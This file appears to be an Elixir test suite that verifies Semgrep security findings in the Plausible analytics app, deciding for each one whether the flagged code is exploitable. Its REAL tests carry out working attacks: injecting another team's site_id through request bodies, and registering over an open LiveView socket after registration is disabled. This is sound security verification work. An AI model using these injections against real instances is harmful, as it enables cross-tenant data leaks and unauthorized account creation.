defmodule Plausible.SemgrepFindingsVerificationTest do
  @moduledoc """
  One executable test per Semgrep finding reported by `.semgrep/plausible-security.yaml`
  on this tree, deciding whether the flagged code is actually exploitable.

  A test named REAL demonstrates the exploit succeeding. A test named NOT EXPLOITABLE
  demonstrates the attack being defeated by something the rule cannot see (a caller
  that overrides the field, an `on_mount` hook, a `put_assoc` that wins). Both
  directions are asserted positively: a "not exploitable" test performs the same
  attack as its REAL counterpart and asserts it fails.
  """

  use PlausibleWeb.ConnCase, async: false
  use Plausible.Test.Support.DNS

  import Mox
  import Phoenix.LiveViewTest

  alias Plausible.Repo

  defp mock_captcha_success do
    expect(Plausible.HTTPClient.Mock, :post, fn _, _, _ ->
      {:ok,
       %Finch.Response{
         status: 200,
         headers: [{"content-type", "application/json"}],
         body: %{"success" => true}
       }}
    end)
  end

  defp put_selfhost_env(opts) do
    original = Application.get_env(:plausible, :selfhost)
    Application.put_env(:plausible, :selfhost, Keyword.merge(original, opts))
    on_exit(fn -> Application.put_env(:plausible, :selfhost, original) end)
  end

  defp get_liveview(conn, url) do
    conn = assign(conn, :live_module, PlausibleWeb.Live.RegisterForm)
    {:ok, lv, _html} = live(conn, url)
    lv
  end

  defp type_into_input(lv, id, text) do
    lv
    |> element("form")
    |> render_change(%{id => text})
  end

  ##############################################################################
  # FINDING 1 — lib/plausible/site/traffic_change_notification.ex:21
  # rule: plausible-ecto-cast-tenant-key          expected verdict: REAL
  ##############################################################################
  describe "FINDING 1 traffic_change_notification.ex:21 casts :site_id" do
    setup [:create_user, :log_in, :create_site]

    test "REAL: request body moves the notification onto another team's site", %{
      conn: conn,
      site: site
    } do
      victim_site = new_site(owner: new_user())

      post(conn, "/sites/#{site.domain}/traffic-change-notification/spike/enable")

      notification =
        Repo.get_by!(Plausible.Site.TrafficChangeNotification, site_id: site.id, type: :spike)

      # The attacker owns `site`, and has no access at all to `victim_site`.
      assert notification.site_id == site.id

      put(conn, "/sites/#{site.domain}/traffic-change-notification/spike", %{
        "traffic_change_notification" => %{"site_id" => victim_site.id}
      })

      moved = Repo.reload!(notification)

      assert moved.site_id == victim_site.id,
             "expected the injected site_id to be persisted, proving the cast is exploitable"

      # The row now reports on the victim's traffic while keeping the attacker's
      # recipient list, which is what turns the write into a data leak.
      assert moved.recipients != []
    end
  end

  ##############################################################################
  # FINDING 2 — lib/plausible/site/tracker_script_configuration.ex:43
  # rule: plausible-ecto-cast-tenant-key          expected verdict: REAL
  ##############################################################################
  describe "FINDING 2 tracker_script_configuration.ex:43 installation_changeset casts :site_id" do
    setup [:create_user, :log_in, :create_site]

    test "REAL: LiveView submit params move the config row onto another team's site", %{
      conn: conn,
      site: site
    } do
      victim_site = new_site(owner: new_user())

      {:ok, config} = PlausibleWeb.Tracker.get_or_create_tracker_script_configuration(site)
      assert config.site_id == site.id

      stub_dns()

      Req.Test.stub(Plausible.InstallationSupport.Checks.Detection, fn conn ->
        conn
        |> put_resp_content_type("application/json")
        |> send_resp(
          200,
          Jason.encode!(
            %{
              "data" => %{
                "v1Detected" => false,
                "gtmLikely" => false,
                "npm" => false,
                "wordpressLikely" => false,
                "wordpressPlugin" => false,
                "completed" => true
              }
            }
          )
        )
      end)

      {:ok, lv, _html} = live(conn, "/#{site.domain}/installation?type=manual")
      render_async(lv, 2000)

      lv
      |> element("form[phx-submit='submit']")
      |> render_submit(%{
        "tracker_script_configuration" => %{
          "installation_type" => "manual",
          "site_id" => victim_site.id
        }
      })

      assert Repo.reload!(config).site_id == victim_site.id,
             "expected the injected site_id to be persisted through the LiveView submit"
    end

    test "REAL: the same injection lands through the public Tracker context function", %{
      site: site
    } do
      victim_site = new_site(owner: new_user())
      {:ok, config} = PlausibleWeb.Tracker.get_or_create_tracker_script_configuration(site)

      PlausibleWeb.Tracker.update_script_configuration!(
        site,
        %{"site_id" => victim_site.id},
        :installation
      )

      assert Repo.reload!(config).site_id == victim_site.id
    end
  end

  ##############################################################################
  # FINDING 3 — lib/plausible_web/router.ex:444 and :453  (/register)
  # rule: plausible-liveview-route-missing-live-session   expected verdict: REAL
  ##############################################################################
  describe "FINDING 3 router.ex:444,453 /register outside a live_session" do
    test "REAL: DISABLE_REGISTRATION is enforced by the router plug only, not by the socket",
         %{conn: conn} do
      # A user exists, so this is not a first-launch instance.
      new_user()

      # 1. While registration is enabled, a client renders the page and connects
      #    the LiveView socket. The router plug runs exactly once, here.
      lv = get_liveview(conn, "/register")

      # 2. The instance now disables registration.
      put_selfhost_env(disable_registration: true)

      # 3. The HTTP route is correctly blocked from this point on.
      blocked = get(build_conn(), "/register")
      assert redirected_to(blocked) == "/login"

      # 4. The already-connected socket is never re-checked: handle_event/3 does
      #    not consult the flag, so registration still succeeds over the socket.
      mock_captcha_success()

      type_into_input(lv, "user[name]", "Socket Attacker")
      type_into_input(lv, "user[email]", "socket.attacker@plausible.test")
      type_into_input(lv, "user[password]", "very-long-and-very-secret-123")

      lv |> element("form") |> render_submit()

      assert Repo.get_by(Plausible.Auth.User, email: "socket.attacker@plausible.test"),
             "expected the account to be created despite registration being disabled"
    end
  end

  ##############################################################################
  # FINDING 4 — lib/plausible/site/tracker_script_configuration.ex:60
  # rule: plausible-ecto-cast-tenant-key   expected verdict: NOT EXPLOITABLE
  ##############################################################################
  describe "FINDING 4 tracker_script_configuration.ex:60 plugins_api_changeset casts :site_id" do
    setup [:create_user, :log_in, :create_site]

    test "NOT EXPLOITABLE: the plugins-API controller overwrites site_id before the cast", %{
      site: site
    } do
      victim_site = new_site(owner: new_user())
      {:ok, config} = PlausibleWeb.Tracker.get_or_create_tracker_script_configuration(site)

      # Exactly what PlausibleWeb.Plugins.API.Controllers.TrackerScriptConfiguration.update/2
      # does: Map.put(update_params, "site_id", site.id) on the attacker's body.
      attacker_body = %{"installation_type" => "manual", "site_id" => victim_site.id}
      sanitised = Map.put(attacker_body, "site_id", site.id)

      PlausibleWeb.Tracker.update_script_configuration!(site, sanitised, :plugins_api)

      assert Repo.reload!(config).site_id == site.id,
             "controller-supplied site_id must win over the attacker's"
    end
  end

  ##############################################################################
  # FINDING 5 — lib/plausible/clickhouse_event_v2.ex:63
  # rule: plausible-ecto-cast-tenant-key   expected verdict: NOT EXPLOITABLE
  ##############################################################################
  describe "FINDING 5 clickhouse_event_v2.ex:63 casts :site_id" do
    test "NOT EXPLOITABLE: ingestion sets site_id from the resolved site, not from the payload" do
      site = new_site()
      victim_site = new_site(owner: new_user())

      payload = %{
        name: "pageview",
        url: "http://#{site.domain}/",
        domain: site.domain,
        # the attacker tries to smuggle the tenancy key through the event body
        site_id: victim_site.id,
        props: %{"site_id" => victim_site.id}
      }

      conn =
        build_conn(:post, "/api/event", Jason.encode!(payload))
        |> put_req_header("content-type", "text/plain")
        |> put_req_header("user-agent", "Mozilla/5.0")

      assert {:ok, request, _conn} = Plausible.Ingestion.Request.build(conn)
      assert {:ok, %{buffered: [event]}} = Plausible.Ingestion.Event.build_and_buffer(request)

      assert event.clickhouse_event.site_id == site.id
      refute event.clickhouse_event.site_id == victim_site.id
    end
  end

  ##############################################################################
  # FINDING 6 — lib/plausible/plugins/api/token.ex:48
  # rule: plausible-ecto-cast-tenant-key   expected verdict: NOT EXPLOITABLE
  ##############################################################################
  describe "FINDING 6 plugins/api/token.ex:48 @fields includes :site_id" do
    test "NOT EXPLOITABLE: the following put_assoc(:site, site) makes the insert impossible" do
      site = new_site()
      victim_site = new_site(owner: new_user())

      generated = Plausible.Plugins.API.Token.generate()

      changeset =
        Plausible.Plugins.API.Token.insert_changeset(site, generated, %{
          description: "attacker token",
          site_id: victim_site.id
        })

      # The cast does accept the field — that is what the rule saw.
      assert Ecto.Changeset.get_change(changeset, :site_id) == victim_site.id

      # But Ecto refuses to write a row whose belongs_to assoc and foreign key
      # disagree, so the injected site_id cannot reach the database at all.
      assert_raise ArgumentError, ~r/because there is already a change setting/, fn ->
        Repo.insert(changeset)
      end

      # The path the application actually uses passes no site_id and works.
      {:ok, token, _raw} = Plausible.Plugins.API.Tokens.create(site, "legitimate token")
      assert token.site_id == site.id
    end
  end

  ##############################################################################
  # FINDING 7 — lib/plausible/site/weekly_report.ex:14 and monthly_report.ex:14
  # rule: plausible-ecto-cast-tenant-key   expected verdict: LATENT, NOT REACHABLE
  ##############################################################################
  describe "FINDING 7 weekly_report.ex:14 / monthly_report.ex:14 cast :site_id" do
    setup [:create_user, :log_in, :create_site]

    test "LATENT: both changesets do accept an attacker-supplied site_id" do
      victim_site = new_site(owner: new_user())

      weekly =
        Plausible.Site.WeeklyReport.changeset(%Plausible.Site.WeeklyReport{}, %{
          site_id: victim_site.id,
          recipients: ["attacker@example.com"]
        })

      monthly =
        Plausible.Site.MonthlyReport.changeset(%Plausible.Site.MonthlyReport{}, %{
          site_id: victim_site.id,
          recipients: ["attacker@example.com"]
        })

      assert Ecto.Changeset.get_change(weekly, :site_id) == victim_site.id
      assert Ecto.Changeset.get_change(monthly, :site_id) == victim_site.id
    end

    test "NOT REACHABLE: no controller hands user params to either changeset", %{
      conn: conn,
      site: site,
      user: user
    } do
      victim_site = new_site(owner: new_user())

      post(conn, "/sites/#{site.domain}/weekly-report/enable", %{
        "site_id" => victim_site.id,
        "weekly_report" => %{"site_id" => victim_site.id},
        "recipients" => ["attacker@example.com"]
      })

      post(conn, "/sites/#{site.domain}/monthly-report/enable", %{
        "site_id" => victim_site.id,
        "monthly_report" => %{"site_id" => victim_site.id},
        "recipients" => ["attacker@example.com"]
      })

      assert Repo.get_by(Plausible.Site.WeeklyReport, site_id: site.id)
      assert Repo.get_by(Plausible.Site.MonthlyReport, site_id: site.id)

      refute Repo.get_by(Plausible.Site.WeeklyReport, site_id: victim_site.id)
      refute Repo.get_by(Plausible.Site.MonthlyReport, site_id: victim_site.id)

      # The recipient list comes from the session, never from the body.
      assert Repo.get_by(Plausible.Site.WeeklyReport, site_id: site.id).recipients == [user.email]
    end
  end

  ##############################################################################
  # FINDING 8 — lib/plausible_web/controllers/stats_controller.ex:268
  # rule: plausible-repo-lookup-missing-tenant-scope   expected verdict: FALSE POSITIVE
  ##############################################################################
  describe "FINDING 8 stats_controller.ex:268 Repo.get_by(SharedLink, slug: slug)" do
    test "FALSE POSITIVE: the slug is the credential, and it only unlocks its own site", %{
      conn: conn
    } do
      site = new_site()

      link =
        insert(:shared_link,
          site: site,
          password_hash: Plausible.Auth.Password.hash("letmein")
        )

      # A wrong password is rejected even though the slug resolved.
      rejected = post(conn, "/share/#{link.slug}/authenticate", %{"password" => "wrong"})
      html_response(rejected, 200)
      refute rejected.resp_cookies["shared-link-#{link.slug}"]

      # The correct password grants access, and the lookup is by the presented
      # credential: there is no ambient "current site" that could have scoped it.
      authed = post(conn, "/share/#{link.slug}/authenticate", %{"password" => "letmein"})
      assert redirected_to(authed, 302) =~ "/#{URI.encode_www_form(site.domain)}"
    end
  end

  ##############################################################################
  # FINDING 9 — lib/plausible_web/router.ex:603,604,645,646
  # rule: plausible-liveview-route-missing-live-session  expected verdict: NOT EXPLOITABLE
  ##############################################################################
  describe "FINDING 9 router.ex:603,604,645,646 live routes outside a live_session" do
    setup [:create_user, :log_in, :create_site]

    test "NOT EXPLOITABLE: ChangeDomain re-authorizes the site in mount/3, not in the pipeline",
         %{conn: conn} do
      victim_site = new_site(owner: new_user())

      # The router scope carries RequireAccountPlug only — no site authorization.
      # If the rule's claim held, this would render the victim's site.
      assert_raise Ecto.NoResultsError, fn ->
        live(conn, "/#{victim_site.domain}/change-domain")
      end
    end

    test "NOT EXPLOITABLE: /sites is scoped to the mounted user, not to the router plug", %{
      conn: conn,
      site: site
    } do
      victim_site = new_site(owner: new_user())

      {:ok, _lv, html} = live(conn, "/sites")

      assert html =~ site.domain
      refute html =~ victim_site.domain
    end

    test "NOT EXPLOITABLE: identity is re-derived on the socket by the global AuthContext hook",
         %{conn: conn} do
      # Every LiveView gets PlausibleWeb.Live.AuthContext through
      # `use PlausibleWeb, :live_view`, so mount sees the session user rather
      # than inheriting anything from conn.assigns set by a router plug.
      {:ok, lv, _html} = live(conn, "/sites")

      assert %Plausible.Auth.User{} = :sys.get_state(lv.pid).socket.assigns.current_user
    end

    test "NOT EXPLOITABLE: an anonymous socket gets no user and no site data" do
      victim_site = new_site(owner: new_user())

      anon = build_conn()
      result = live(anon, "/sites")

      case result do
        {:error, {:redirect, %{to: to}}} ->
          assert to =~ "/login"

        {:ok, _lv, html} ->
          refute html =~ victim_site.domain
      end
    end
  end
end
